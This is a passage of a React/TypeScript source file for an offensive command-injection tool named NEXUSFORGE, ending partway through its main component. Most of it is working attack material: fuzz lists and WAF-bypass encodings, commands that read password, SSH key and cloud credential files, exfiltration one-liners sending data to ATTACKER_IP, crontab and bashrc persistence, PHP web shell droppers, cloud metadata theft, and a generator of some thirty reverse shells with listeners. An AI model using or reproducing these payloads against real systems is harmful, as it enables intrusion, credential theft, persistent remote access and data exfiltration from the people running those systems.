import React, { useState, useRef, useEffect, useCallback } from "react";
import {
  useGetHubStatus,
  useGetEngines,
  useGetLogs,
  useClearLogs,
  useGetSuggestions,
  getGetHubStatusQueryKey,
  getGetEnginesQueryKey,
  getGetLogsQueryKey,
  getGetSuggestionsQueryKey,
} from "@workspace/api-client-react";
import { useQueryClient } from "@tanstack/react-query";
import OobPanel from "./OobPanel";
import AutoExploitPanel from "./AutoExploitPanel";
import ChainReplayPanel from "./ChainReplayPanel";
import CvePanel from "./CvePanel";

// ─── ENGINES ──────────────────────────────────────────────
const ENGINE_OPTIONS = [
  { value: "bash/bash",             label: "Bash" },
  { value: "bash/sh",               label: "Sh" },
  { value: "node/exec",             label: "Node exec()" },
  { value: "node/spawn",            label: "Node spawn()" },
  { value: "python/subprocess",     label: "Python subprocess" },
  { value: "python/os_system",      label: "Python os.system" },
  { value: "python/exec",           label: "Python exec()" },
  { value: "ruby/system",           label: "Ruby system()" },
  { value: "ruby/popen",            label: "Ruby IO.popen" },
  { value: "ruby/eval",             label: "Ruby eval" },
  { value: "perl/system",           label: "Perl system()" },
  { value: "perl/exec",             label: "Perl exec()" },
  { value: "perl/open",             label: "Perl open()" },
  { value: "php/system",            label: "PHP system()" },
  { value: "php/exec",              label: "PHP exec()" },
  { value: "php/shell_exec",        label: "PHP shell_exec()" },
  { value: "php/passthru",          label: "PHP passthru()" },
  { value: "java/runtime",          label: "Java Runtime.exec" },
  { value: "java/processbuilder",   label: "Java ProcessBuilder" },
  { value: "cpp/system",            label: "C++ system()" },
  { value: "cpp/popen",             label: "C++ popen()" },
  { value: "powershell/powershell", label: "PowerShell" },
];

// ─── MODES ────────────────────────────────────────────────
const MODES = [
  "timing","windows_timing","stealth",
  "classic","ifs","concat","env",
  "blind","oob","hex","b64loop","unicode",
  "ansi_c","arith","heredoc","wildcard","comment",
  "null","brace","process_sub","rev","double_enc",
  "quantum","ssti","log4shell","xxe","polyglot",
  "rev_shell","windows_rev","cloud","container",
  "windows","antiforensics",
] as const;
type Mode = typeof MODES[number];

const MODE_COLOR: Record<string, string> = {
  timing:"text-green-400", windows_timing:"text-blue-300", stealth:"text-emerald-300",
  classic:"text-lime-400", blind:"text-yellow-400", oob:"text-orange-400",
  quantum:"text-fuchsia-400", ifs:"text-cyan-400", concat:"text-blue-400",
  hex:"text-emerald-400", b64loop:"text-violet-400", env:"text-rose-400",
  heredoc:"text-amber-400",
  unicode:"text-sky-400", "null":"text-zinc-400", wildcard:"text-teal-400",
  comment:"text-orange-300", double_enc:"text-pink-400",
  ssti:"text-red-500", log4shell:"text-orange-500", xxe:"text-purple-400", polyglot:"text-indigo-400",
  brace:"text-teal-300", process_sub:"text-violet-300", arith:"text-sky-300",
  ansi_c:"text-lime-300", rev:"text-pink-300",
  rev_shell:"text-red-600", windows_rev:"text-red-500", cloud:"text-amber-400", container:"text-cyan-300",
  windows:"text-blue-400", antiforensics:"text-red-400",
};
const MODE_DESC: Record<string, string> = {
  timing:"Sleep oracle", windows_timing:"Win sleep oracle", stealth:"Low-noise $0",
  classic:"Direct",  blind:"Time-delay", oob:"OOB exfil",  quantum:"Multi-layer",
  ifs:"IFS spaces",  concat:"Quote split", hex:"printf hex", b64loop:"Nested b64",
  env:"Env var",     heredoc:"Heredoc",
  unicode:"printf \\x", "null":"Null-byte", wildcard:"Shell glob",
  comment:"#-break", double_enc:"%25xx",
  ssti:"SSTI inject", log4shell:"Log4j JNDI", xxe:"XML entity", polyglot:"Multi-vector",
  brace:"Brace expand", process_sub:"Proc sub", arith:"$((n))",
  ansi_c:"ANSI-C \\x", rev:"Reversed exec",
  rev_shell:"Rev shell", windows_rev:"Win rev shell", cloud:"Cloud meta", container:"Container esc",
  windows:"Win CMD/PS", antiforensics:"Zero-trace",
};

// ─── TABS ─────────────────────────────────────────────────
const TABS = ["AUTOCHAIN","TERMINAL","SCANNER","FUZZER","SHELLS","ENCODER","LIBRARY","OOB","REPLAYS","CVE"] as const;
type Tab = typeof TABS[number];

// ─── FUZZER ───────────────────────────────────────────────
const FUZZ_SETS: Record<string, string[]> = {
  "RCE Direct":    [";id","&&id","||id","|id","`id`","$(id)","${IFS}id","%0aid","%0d%0aid",";id;","\\nid"],
  "SSTI Jinja2":   ["{{7*7}}","{{7*'7'}}","{{config.items()}}","{{''.__class__.__mro__[1].__subclasses__()}}","{{lipsum.__globals__['os'].popen('id').read()}}"],
  "SSTI Generic":  ["<%=7*7%>","*{7*7}","#{7*7}","<%= 7*7 %>","${7*7}","@{7*7}"],
  "Path Traversal":["../etc/passwd","../../etc/passwd","....//etc/passwd","..%2Fetc%2Fpasswd","..%252Fetc%252Fpasswd","%2e%2e%2fetc%2fpasswd","../etc/passwd%00","..%c0%af..%c0%afetc%c0%afpasswd"],
  "Null Bytes":    ["%00","%00.jpg","%2500","\\x00","%00;","\\u0000"],
  "Space Bypass":   ["${IFS}","$IFS","$'\\t'","${IFS:0:1}","$'\\x20'","%20","<","\\t"],
  "Quote Evasion":  ["''","\"\"","'\"'","i''d","c'a't","w'h'o'a'm'i"],
  "Separators":     [";","&&","||","|","&","%0a","%0d%0a","|%0a","\\n"],
  "Wildcards":      ["?","*","/*","??","[a-z]*","???"],
  "Null Inject":     ["%00","\\x00","%2500","\\0","%00;"],
  "IFS Tricks":     ["${IFS}id","id${IFS}",";id;","||id||","${IFS}id${IFS}"],
  "Brace Expand":   ["{id,}","{whoami,}","{cat,/etc/passwd}","{bash,}","{sh,}"],
  "Concat Bypass":  ["i''d","ca''t","w'h'o'a'm'i","ba''sh","c\"\"at"],
  "Encoding":       ["$(echo aWQ=|base64 -d)","$(printf '\\x69\\x64')","$(printf '\\151\\144')"],
  "Path Abuse":     ["${PATH:0:1}etc${PATH:0:1}passwd","/???/pa?sw?","/${PATH:0:1}bin/cat /etc/passwd"],
};

// ─── PAYLOAD LIBRARY ──────────────────────────────────────
const PAYLOAD_LIBRARY = [
  { cat:"RECON",       col:"text-lime-400", p:[
    "id && uname -a && hostname",
    "cat /proc/version && cat /etc/os-release 2>/dev/null",
    "ps auxf 2>/dev/null | head -30",
    "ss -tulpn 2>/dev/null || netstat -tulpn",
    "env | grep -v '^_' | sort",
    "df -h && free -m",
    "ls -la / && ls -la /home/ 2>/dev/null",
    "ip a 2>/dev/null || ifconfig 2>/dev/null",
    "route -n 2>/dev/null || ip route",
    "cat /proc/1/cmdline | tr '\\0' ' '",
    "last -n 20 2>/dev/null && w 2>/dev/null",
    "lsof -i 2>/dev/null | head -20",
    "cat /etc/group | grep -E '(sudo|wheel|admin|docker)'",
    "arp -n 2>/dev/null",
    "uptime && cat /proc/loadavg",
    "cat /proc/self/cgroup",
    "find / -name '*.conf' -readable 2>/dev/null | head -10",
  ]},
  { cat:"FILE READ",   col:"text-yellow-400", p:[
    "cat /etc/passwd",
    "cat /etc/shadow 2>/dev/null",
    "cat /etc/hosts && cat /etc/resolv.conf",
    "cat ~/.ssh/id_rsa 2>/dev/null",
    "cat ~/.ssh/authorized_keys 2>/dev/null",
    "cat ~/.bash_history 2>/dev/null | tail -30",
    "find / -name '*.env' -readable 2>/dev/null | xargs cat 2>/dev/null | head -50",
    "cat /proc/self/environ | tr '\\0' '\\n'",
    "find / -name '*.pem' -o -name 'id_rsa' 2>/dev/null | head -10",
    "cat /var/log/auth.log 2>/dev/null | tail -30",
    "cat /root/.bash_history 2>/dev/null",
    "cat ~/.aws/credentials 2>/dev/null",
    "cat /run/secrets/* 2>/dev/null",
    "find / -name '.git/config' 2>/dev/null | xargs cat 2>/dev/null",
    "find / -name '*.yaml' 2>/dev/null | grep -i secret | head -5 | xargs cat 2>/dev/null",
  ]},
  { cat:"RCE CHAINS",  col:"text-red-400", p:[
    "id; whoami; uname -a",
    "127.0.0.1 && id",
    "127.0.0.1; id",
    "127.0.0.1 | id",
    "127.0.0.1 || id",
    "127.0.0.1`id`",
    "$(id)",
    "; id #",
    "' ; id #",
    "\" ; id #",
    ") ; id #",
    "} ; id #",
    "sleep 0; id",
    "true; id",
    "ping -c 1 127.0.0.1; id",
    "id%0aid",
    "id && ls /root 2>/dev/null",
    "id;ls${IFS}-la",
  ]},
  { cat:"WAF BYPASS",  col:"text-orange-400", p:[
    "${IFS}id${IFS}",
    "i''d",
    "w'h'o'a'm'i",
    "cat${IFS}/etc/passwd",
    "/bin/c?t${IFS}/etc/pass*",
    "/???/??t${IFS}/etc/pass*",
    "l\\s${IFS}-la",
    "who$(echo${IFS}a)mi",
    "`echo${IFS}id|sh`",
    "$(printf${IFS}'\\x69\\x64')",
    "bash${IFS}-c${IFS}'id'",
    "{id,}",
    "{cat,/etc/passwd}",
    "bash<<<id",
    "X=id;$X",
    "_c=ca;_t=t;$_c$_t${IFS}/etc/passwd",
    "$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh)",
    "${PATH:14:1}d",
    "i$()d",
    "cat /etc/'passwd'",
  ]},
  { cat:"ENCODING",    col:"text-cyan-400", p:[
    "$(printf '\\x69\\x64')",
    "$(printf '\\151\\144')",
    "bash<<<$(base64 -d<<<aWQ=)",
    "echo aWQ= | base64 -d | bash",
    "{echo,aWQ=}|{base64,-d}|bash",
    "python3 -c \"import os;os.system('\\x69\\x64')\"",
    "perl -e 'system(\"\\x69\\x64\")'",
    "ruby -e \"system('\\x69\\x64')\"",
    "X=$'\\x69\\x64';$X",
    "$(echo -e '\\x69\\x64')",
    "eval \"$(printf '\\x69\\x64')\"",
    "xxd -r -p <<< 6964 | bash",
  ]},
  { cat:"BLIND TIME",  col:"text-yellow-300", p:[
    "id && sleep 5",
    "ping -c 5 127.0.0.1",
    "id; sleep 7",
    "id||(sleep 9)",
    "bash -c 'sleep 6'",
    "$(sleep 5)",
    "`sleep 5`",
    "id & sleep 8 & wait",
    ";sleep${IFS}9;",
    "&&sleep${IFS}7&&",
    "id || sleep 10",
  ]},
  { cat:"OOB EXFIL",   col:"text-purple-400", p:[
    "id && curl -sk 'http://ATTACKER_IP:ATTACKER_PORT/?x='$(id|base64 -w0) &",
    "nslookup $(whoami).ATTACKER_IP",
    "cat /etc/passwd | curl -sk -X POST http://ATTACKER_IP:ATTACKER_PORT/ --data-binary @-",
    "curl -sk -d \"$(env|base64 -w0)\" http://ATTACKER_IP:ATTACKER_PORT/ &",
    "dig +short $(id|base64|head -c30|tr -d =).ATTACKER_IP &",
    "curl -sk --upload-file /etc/passwd http://ATTACKER_IP:ATTACKER_PORT/",
    "python3 -c \"import socket,os;s=socket.socket();s.connect(('ATTACKER_IP',ATTACKER_PORT));s.send(os.popen('id').read().encode())\" &",
  ]},
  { cat:"QUANTUM",     col:"text-fuchsia-400", p:[
    "bash<<<$(base64 -d<<<aWQ=)",
    "eval $(echo 'aWQ=' | base64 -d)",
    "{echo,aWQ=}|{base64,-d}|bash",
    "X=$'\\x69\\x64';$X",
    "_=$(echo aWQ=|base64 -d);eval$IFS$_",
    "python3 -c \"import base64,os;os.system(base64.b64decode('aWQ=').decode())\"",
    "ruby -e \"require 'base64';system(Base64.decode64('aWQ='))\"",
    "perl -MMIME::Base64 -e \"system(decode_base64('aWQ='))\"",
  ]},
  { cat:"PRIVESC",     col:"text-red-500", p:[
    "sudo -l",
    "find / -perm -4000 -type f 2>/dev/null",
    "find / -perm -2000 -type f 2>/dev/null",
    "find / -writable -type d 2>/dev/null | head -10",
    "cat /etc/crontab && ls /etc/cron* 2>/dev/null",
    "getcap -r / 2>/dev/null",
    "cat /etc/sudoers 2>/dev/null",
    "dpkg -l | grep -E '(screen|vim|nmap|perl|python|ruby|gcc)'",
    "pkexec --version 2>/dev/null && echo 'CVE-2021-4034'",
    "env | grep -iE '(sudo|ld_preload|python|ruby|perl)'",
    "find / -name 'python*' -perm /u+s 2>/dev/null",
  ]},
  { cat:"CLOUD META",  col:"text-sky-400", p:[
    "curl -sk http://169.254.169.254/latest/meta-data/",
    "curl -sk http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "curl -sk http://169.254.169.254/latest/dynamic/instance-identity/document",
    "curl -sk http://169.254.169.254/computeMetadata/v1/ -H 'Metadata-Flavor:Google'",
    "curl -sk http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H 'Metadata:true'",
    "curl -sk http://100.100.100.200/latest/meta-data/",
    "curl -sk http://169.254.169.254/latest/user-data",
  ]},
  { cat:"CONTAINER",   col:"text-teal-400", p:[
    "cat /proc/1/cgroup | grep -i docker",
    "ls -la /.dockerenv 2>/dev/null && echo 'in docker'",
    "cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null",
    "env | grep -iE 'kube|k8s|docker|container'",
    "find / -name 'docker.sock' 2>/dev/null",
    "curl -sk --unix-socket /run/docker.sock http://localhost/containers/json",
    "capsh --print 2>/dev/null",
    "kubectl get pods --all-namespaces 2>/dev/null",
  ]},
  { cat:"PERSISTENCE", col:"text-rose-400", p:[
    "echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' >> /etc/crontab",
    "echo 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' >> ~/.bashrc",
    "(crontab -l 2>/dev/null; echo '@reboot bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1') | crontab -",
    "mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
  ]},
  { cat:"SSRF",        col:"text-indigo-400", p:[
    "curl -sk http://127.0.0.1/admin",
    "curl -sk http://localhost:8080/",
    "curl -sk http://0.0.0.0:80/",
    "curl -sk http://[::1]:80/",
    "curl -sk http://127.0.0.1:6379/ && echo PING | nc 127.0.0.1 6379",
    "curl -sk file:///etc/passwd",
    "curl -sk dict://127.0.0.1:6379/info",
    "curl -sk gopher://127.0.0.1:6379/_INFO%0d%0a",
  ]},
  { cat:"DATA EXFIL",  col:"text-pink-400", p:[
    "tar czf - /etc/passwd | base64 | curl -sk -X POST http://ATTACKER_IP:ATTACKER_PORT/ -d @-",
    "cat /etc/passwd | nc ATTACKER_IP ATTACKER_PORT",
    "cat /etc/shadow | openssl base64 | curl -sk -X POST http://ATTACKER_IP:ATTACKER_PORT/ -d @-",
    "env | base64 | curl -sk -X POST http://ATTACKER_IP:ATTACKER_PORT/ -d @-",
    "find / -name '*.key' 2>/dev/null | xargs cat | base64 | curl -sk -X POST http://ATTACKER_IP:ATTACKER_PORT/ -d @-",
  ]},
  { cat:"WEB SHELLS",  col:"text-green-400", p:[
    "echo '<?php system($_GET[\"c\"]); ?>' > /var/www/html/shell.php",
    "echo '<?php @eval($_POST[\"c\"]); ?>' > /var/www/html/cmd.php",
    "echo '<?php passthru($_GET[\"cmd\"]); ?>' > /tmp/shell.php",
    "python3 -m http.server ATTACKER_PORT &",
    "php -S 0.0.0.0:ATTACKER_PORT &",
    "ruby -run -e httpd /tmp -p ATTACKER_PORT &",
    "busybox httpd -f -p ATTACKER_PORT &",
  ]},
];

// ─── REVERSE SHELLS ───────────────────────────────────────
function buildShells(ip: string, port: string) {
  const i = ip || "ATTACKER_IP";
  const p = port || "4444";
  return [
    { cat:"Bash",   name:"Bash TCP",      cmd:`bash -i >& /dev/tcp/${i}/${p} 0>&1` },
    { cat:"Bash",   name:"Bash UDP",      cmd:`bash -i >& /dev/udp/${i}/${p} 0>&1` },
    { cat:"Bash",   name:"Bash Exec",     cmd:`bash -c 'exec bash -i &>/dev/tcp/${i}/${p} <&1'` },
    { cat:"NC",     name:"NC mkfifo",     cmd:`rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${i} ${p} >/tmp/f` },
    { cat:"NC",     name:"NC -e",         cmd:`nc -e /bin/sh ${i} ${p}` },
    { cat:"NC",     name:"BusyBox NC",    cmd:`busybox nc ${i} ${p} -e sh` },
    { cat:"NC",     name:"NC OpenBSD",    cmd:`rm /tmp/f;mkfifo /tmp/f;nc ${i} ${p} </tmp/f|/bin/bash >/tmp/f 2>&1` },
    { cat:"Python", name:"Python3",       cmd:`python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${i}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
    { cat:"Python", name:"Python3 PTY",   cmd:`python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${i}",${p}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'` },
    { cat:"Python", name:"Python2",       cmd:`python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${i}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
    { cat:"Perl",   name:"Perl",          cmd:`perl -e 'use Socket;$i="${i}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'` },
    { cat:"Ruby",   name:"Ruby",          cmd:`ruby -rsocket -e 'f=TCPSocket.open("${i}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
    { cat:"PHP",    name:"PHP",           cmd:`php -r '$s=fsockopen("${i}",${p});$p=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$pipes);'` },
    { cat:"Node",   name:"Node.js",       cmd:`node -e "(function(){var n=require('net'),s=new n.Socket();s.connect(${p},'${i}',function(){var sh=require('child_process').spawn('/bin/sh',[]);s.pipe(sh.stdin);sh.stdout.pipe(s);sh.stderr.pipe(s)});})()"` },
    { cat:"Go",     name:"Go",            cmd:`echo 'package main;import(n"net"s"os/exec");func main(){c,_:=n.Dial("tcp","${i}:${p}");cmd:=s.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/sh.go && go run /tmp/sh.go` },
    { cat:"Socat",  name:"Socat PTY",     cmd:`socat exec:'bash -i',pty,stderr,setsid,sigint,sane tcp:${i}:${p}` },
    { cat:"Socat",  name:"Socat UDP",     cmd:`socat udp:${i}:${p} exec:/bin/sh` },
    { cat:"AWK",    name:"AWK",           cmd:`awk 'BEGIN{s="/inet/tcp/0/${i}/${p}";for(;;){if((s|&getline c)<=0)break;while((c|getline)>0)print|&s;close(c)}}'` },
    { cat:"SSL",    name:"OpenSSL",       cmd:`openssl s_client -quiet -connect ${i}:${p}|/bin/bash 2>&1|openssl s_client -quiet -connect ${i}:$((${p}+1))` },
    { cat:"PS",     name:"PowerShell",    cmd:`powershell -NoP -NonI -W Hidden -Exec Bypass -Command $c=New-Object Net.Sockets.TCPClient("${i}",${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write([text.encoding]::ASCII.GetBytes($r),0,$r.Length)};$c.Close()` },
    { cat:"Lua",    name:"Lua",           cmd:`lua -e "require('socket');local s=require('socket').tcp();s:connect('${i}',${p});while true do local c=s:receive();local f=io.popen(c,'r');local r=f:read('*a');f:close();s:send(r) end"` },
    { cat:"R",      name:"R",             cmd:`Rscript -e "s<-socketConnection('${i}',port=${p},blocking=TRUE,server=FALSE,open='r+');while(TRUE){cmd<-readLines(s,1);system(cmd)}"` },
    { cat:"SSL",    name:"OpenSSL-SSL",     cmd:`openssl s_client -quiet -connect ${i}:${p}|/bin/bash 2>&1|openssl s_client -quiet -connect ${i}:${String(Number(p)+1)}` },
    { cat:"SSL",    name:"Socat SSL",      cmd:`socat openssl:${i}:${p},verify=0 exec:/bin/bash,pty,stderr,setsid,sigint,sane` },
    { cat:"Telnet", name:"Telnet mkfifo",  cmd:`TF=\$(mktemp -u);mkfifo \$TF && telnet ${i} ${p} 0<\$TF | /bin/sh 1>\$TF` },
    { cat:"Bash",   name:"Bash fd 196",    cmd:`exec 196<>/dev/tcp/${i}/${p}; sh <&196 >&196 2>&196` },
    { cat:"Bash",   name:"Bash 3-fd",      cmd:`sh -i 3<>/dev/tcp/${i}/${p} <&3 >&3 2>&3` },
    { cat:"Python", name:"Py3 SSL",        cmd:`python3 -c "import socket,ssl,subprocess,os;s=ssl.wrap_socket(socket.socket());s.connect(('${i}',${p}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(['/bin/sh','-i'])" 2>/dev/null` },
    { cat:"Curl",   name:"Curl C2 loop",   cmd:`while true; do C=\$(curl -sk http://${i}:${p}/c 2>/dev/null); [ -n "\$C" ] && eval "\$C" | curl -sk -X POST http://${i}:${p}/r -d @-; sleep 3; done &` },
    { cat:"Go",     name:"Go compile",     cmd:`printf 'package main\nimport("net""os/exec")\nfunc main(){c,_:=net.Dial("tcp","${i}:${p}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/s.go && go run /tmp/s.go 2>/dev/null &` },
    { cat:"PHP",    name:"PHP proc_open",  cmd:`php -r "\$s=fsockopen('${i}',${p});\$p=proc_open('/bin/sh',array(0=>\$s,1=>\$s,2=>\$s),\$pipes);"` },
    { cat:"Java",   name:"Java JDWP",      cmd:`java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:${p}` },
  ];
}

function buildListeners(port: string) {
  const p = port || "4444";
  return [
    { name:"NetCat",       cmd:`nc -lvnp ${p}` },
    { name:"NetCat UDP",   cmd:`nc -lvnup ${p}` },
    { name:"Socat TTY",    cmd:`socat file:\`tty\`,raw,echo=0 tcp-listen:${p}` },
    { name:"OpenSSL",      cmd:`openssl req -x509 -newkey rsa:2048 -keyout /tmp/k.pem -out /tmp/c.pem -days 1 -nodes -subj '/CN=x' && openssl s_server -quiet -key /tmp/k.pem -cert /tmp/c.pem -port ${p}` },
    { name:"Metasploit",   cmd:`msfconsole -q -x "use multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT ${p}; run"` },
    { name:"Python HTTP",  cmd:`python3 -m http.server ${p}` },
  ];
}

// ─── ENCODER ──────────────────────────────────────────────
type EncType = "base64"|"base64url"|"hex"|"url"|"double-url"|"html"|"unicode"|"octal"|"rot13"|"reverse"|"printf-hex";
const ENC_TYPES: { value: EncType; label: string }[] = [
  {value:"base64",     label:"Base64"},
  {value:"base64url",  label:"Base64 URL-safe"},
  {value:"hex",        label:"Hex"},
  {value:"url",        label:"URL Encode"},
  {value:"double-url", label:"Double URL"},
  {value:"html",       label:"HTML Entities"},
  {value:"unicode",    label:"Unicode Escape"},
  {value:"octal",      label:"Octal Escape"},
  {value:"rot13",      label:"ROT13"},
  {value:"reverse",    label:"Reverse"},
  {value:"printf-hex", label:"printf hex"},
];

function encodeText(t: string, type: EncType): string {
  try {
    const b = new TextEncoder().encode(t);
    switch (type) {
      case "base64":    return btoa(t);
      case "base64url": return btoa(t).replace(/\+/g,"-").replace(/\//g,"_").replace(/=/g,"");
      case "hex":       return Array.from(b).map(x=>x.toString(16).padStart(2,"0")).join("");
      case "url":       return encodeURIComponent(t);
      case "double-url":return encodeURIComponent(encodeURIComponent(t));
      case "html":      return t.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#x27;");
      case "unicode":   return Array.from(t).map(c=>`\\u${c.charCodeAt(0).toString(16).padStart(4,"0")}`).join("");
      case "octal":     return Array.from(b).map(x=>`\\0${x.toString(8)}`).join("");
      case "rot13":     return t.replace(/[a-zA-Z]/g,c=>String.fromCharCode(c.charCodeAt(0)+(c.toLowerCase()<"n"?13:-13)));
      case "reverse":   return [...t].reverse().join("");
      case "printf-hex":return `$(printf '${Array.from(b).map(x=>`\\x${x.toString(16).padStart(2,"0")}`).join("")}')`;
    }
  } catch { return "[encoding error]"; }
}

function decodeText(t: string, type: EncType): string {
  try {
    switch (type) {
      case "base64":
      case "base64url": return atob(t.replace(/-/g,"+").replace(/_/g,"/"));
      case "hex":       return new TextDecoder().decode(new Uint8Array((t.match(/.{1,2}/g)||[]).map(h=>parseInt(h,16))));
      case "url":       return decodeURIComponent(t);
      case "double-url":return decodeURIComponent(decodeURIComponent(t));
      case "html":      return t.replace(/&amp;/g,"&").replace(/&lt;/g,"<").replace(/&gt;/g,">").replace(/&quot;/g,'"').replace(/&#x27;/g,"'");
      case "unicode":   return t.replace(/\\u([0-9a-fA-F]{4})/g,(_,h)=>String.fromCharCode(parseInt(h,16)));
      case "rot13":     return t.replace(/[a-zA-Z]/g,c=>String.fromCharCode(c.charCodeAt(0)+(c.toLowerCase()<"n"?13:-13)));
      case "reverse":   return [...t].reverse().join("");
      default: return "[decode not supported for this type]";
    }
  } catch { return "[decoding error]"; }
}

// ─── TERMINAL COLORIZER ───────────────────────────────────
function colorLine(line: string): string {
  if (/\u2714\s+EXECUTION\s+CONFIRMED/.test(line)) return "text-green-300 font-bold";
  if (/POSSIBLE\s+BLIND\s+RCE/.test(line))         return "text-yellow-300 font-bold";
  if (/\u2716\s+WAF:/.test(line))                  return "text-orange-400 font-bold";
  if (/^\[NEXUSFORGE\]/.test(line))                return "text-red-400 font-bold";
  if (/^\[TARGET\]/.test(line))                    return "text-amber-400";
  if (/^\[METHOD\]/.test(line))                    return "text-amber-300";
  if (/^\[PARAM\]/.test(line))                     return "text-amber-300";
  if (/^\[MODE\]/.test(line))                      return "text-fuchsia-400";
  if (/^\[ENV\]/.test(line))                       return "text-purple-400";
  if (/^\[HINT\]/.test(line))                      return "text-blue-400";
  if (/^\[BASELINE\]/.test(line))                  return "text-zinc-500";
  if (/^\[PROBE\]/.test(line))                     return "text-cyan-400";
  if (/^\[INJECT\]/.test(line))                    return "text-cyan-300";
  if (/^\[STRATEGY\]/.test(line))                  return "text-yellow-400";
  if (/^\[ESCALATE\]/.test(line))                  return "text-orange-300";
  if (/^\[TIMING\]/.test(line))                    return "text-yellow-200 font-bold";
  if (/^\[WARN\]/.test(line))                      return "text-yellow-500";
  if (/^\[ERROR\]/.test(line))                     return "text-red-500";
  if (/^\[SSH\]/.test(line))                       return "text-teal-400";
  if (/^\[exit:0/.test(line))                      return "text-green-400";
  if (/^\[exit:[^0]/.test(line))                   return "text-red-400";
  if (/^\[KILLED\]/.test(line))                    return "text-red-600 font-bold";
  if (/^---\s+RESPONSE/.test(line))                return "text-zinc-500";
  if (/^\s*HTTP\s+[45]\d\d/.test(line))            return "text-red-400";
  if (/^\s*HTTP\s+[23]\d\d/.test(line))            return "text-green-500";
  if (/^\s*payload:/.test(line))                   return "text-cyan-500";
  if (/^\s*\d+\/\d+\s+\[/.test(line))             return "text-zinc-600";
  if (/^\u2500{3,}$/.test(line) || /^\u2550{3,}$/.test(line) || /^\u2501{3,}$/.test(line)) return "text-zinc-800";
  if (/^root@/.test(line))                         return "text-lime-300 font-bold";
  if (/^\[WS\]/.test(line))                        return "text-zinc-600";
  return "text-lime-400";
}

// ─── SCANNER DATA ─────────────────────────────────────────
const SCAN_PRESETS: Record<string, number[]> = {
  "TOP 40":  [21,22,23,25,53,80,110,111,135,139,143,443,445,587,993,995,1433,1521,2049,2375,3000,3306,3389,4444,5000,5432,5900,6379,6443,8000,8080,8443,8888,9200,10250,27017,5984,9300,15672,50070],
  "WEB":     [80,443,3000,3001,4200,5000,5001,7000,8000,8001,8008,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8443,8888,9000],
  "DATABASE":[1433,1521,3306,5432,5601,5984,6379,7474,9200,9300,11211,27017,27018,28017,15672,2181,9418],
  "CLOUD":   [2375,2376,2379,2380,4001,4002,6443,8443,10250,10255,10256,30000,31337,9090,9091,9093],
};

interface ScanResult { port: number; open: boolean; service: string; banner: string }

interface FuzzResult { payload: string; output: string; elapsed: number; ok: boolean }

// ─── COMPONENT ────────────────────────────────────────────
export default function MainLab() {
  const qc = useQueryClient();

  // Core state
  const [tab,      setTab]      = useState<Tab>("AUTOCHAIN");
  const [cmd,      setCmd]      = useState("");
  const [engine,   setEngine]   = useState("bash/bash");
  const [mode,     setMode]     = useState<Mode>("classic");
  const [target,   setTarget]   = useState("");
  const [attIp,    setAttIp]    = useState("");
  const [attPort,  setAttPort]  = useState("4444");
  const [output,   setOutput]   = useState("NEXUSFORGE v9.0 — 33 Modes · 9 Engines · WS Chain · Scanner · Remote Injection · Env Probe\n");
  // Remote injection state
  const [injectionUrl,   setInjectionUrl]   = useState("");
  const [injectParam,    setInjectParam]    = useState("cmd");
  const [httpMethod,     setHttpMethod]     = useState("GET");
  const [customHeaders,  setCustomHeaders]  = useState("");
  const [probeResult,  setProbeResult]  = useState<string|null>(null);
  const [probing,      setProbing]      = useState(false);
  const [running,  setRunning]  = useState(false);
  const [score,    setScore]    = useState(0);
  const [chain,    setChain]    = useState<string[]>([]);
  const [stats,    setStats]    = useState({total:0,timing:0,windows_timing:0,stealth:0,classic:0,blind:0,oob:0,quantum:0,ifs:0,concat:0,hex:0,b64loop:0,env:0,heredoc:0,unicode:0,"null":0,wildcard:0,comment:0,double_enc:0,ssti:0,log4shell:0,xxe:0,polyglot:0,brace:0,process_sub:0,arith:0,ansi_c:0,rev:0,rev_shell:0,windows_rev:0,cloud:0,container:0,windows:0,antiforensics:0});
  const [copyId,   setCopyId]   = useState<string|null>(null);
  const [history,  setHistory]  = useState<string[]>([]);
  const [histIdx,  setHistIdx]  = useState(-1);
  const [draft,    setDraft]    = useState("");
  const [libCat,   setLibCat]   = useState(0);
  const [libSearch,setLibSearch]= useState("");
  const [shellCat, setShellCat] = useState("All");

  // Fuzzer state
